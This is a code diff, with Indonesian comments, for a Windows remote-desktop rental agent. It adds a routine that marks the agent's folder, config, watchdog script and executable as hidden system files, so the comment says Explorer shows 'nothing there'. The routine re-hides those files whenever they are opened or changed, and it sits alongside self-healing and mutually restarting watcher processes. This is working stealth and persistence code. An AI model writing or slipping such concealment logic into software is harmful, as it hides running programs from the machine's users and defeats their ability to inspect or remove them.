@@ -1429,6 +1429,27 @@ function coreFileHashes(): Record<string, string> {
   return out;
 }
 
+// Sembunyikan file & folder permanen (hidden + system) supaya terlihat "tidak ada apa-apa"
+// di Explorer — tapi file aslinya tetap ada di C:\ProgramData\rentalrdp-agent.
+let lastHide = 0;
+async function hideAssets(): Promise<void> {
+  if (process.platform !== "win32") return;
+  const now = Date.now();
+  if (now - lastHide < 60000) return;
+  lastHide = now;
+  const targets = [
+    STABLE_DIR,
+    join(STABLE_DIR, "config.json"),
+    join(STABLE_DIR, ".cfg.last"),
+    join(STABLE_DIR, "rentalrdp-agent-watchdog.bat"),
+    STABLE_EXE,
+    STABLE_EXE + ".bak",
+  ];
+  for (const p of targets) {
+    if (existsSync(p)) await runExe(["attrib", "+h", "+s", p]).catch(() => {});
+  }
+}
+
 // Perbaiki file inti agent yang hilang/diubah (dipanggil MAIN tiap loop & WATCHER tiap poll).
 let lastTaskHeal = 0;
 async function selfHealFiles(): Promise<void> {
@@ -1541,10 +1562,10 @@ async function selfHealFiles(): Promise<void> {
         }
       }
     } catch {}
+  // 6) samarkan kembali file & folder permanen (hidden+system) kalau dibuka/diubah.
+    await hideAssets();
   } catch {}
 }
-
-// MAIN memastikan WATCHER hidup (tiap beberapa loop); WATCHER memastikan MAIN hidup.
 let lastWatcherCheck = 0;
 async function ensureWatcher(): Promise<void> {
   const now = Date.now();
